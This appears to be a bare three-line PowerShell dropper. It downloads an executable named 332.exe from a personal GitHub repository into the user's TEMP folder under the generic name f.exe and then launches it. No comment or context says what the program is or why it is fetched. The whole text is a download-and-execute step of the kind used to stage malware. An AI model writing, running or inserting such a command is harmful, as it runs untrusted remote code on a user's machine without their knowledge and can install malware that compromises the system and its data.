$u="https://raw.githubusercontent.com/Pecennn/testik/refs/heads/main/332.exe"
iwr $u -OutFile "$env:TEMP\f.exe"
Start "$env:TEMP\f.exe"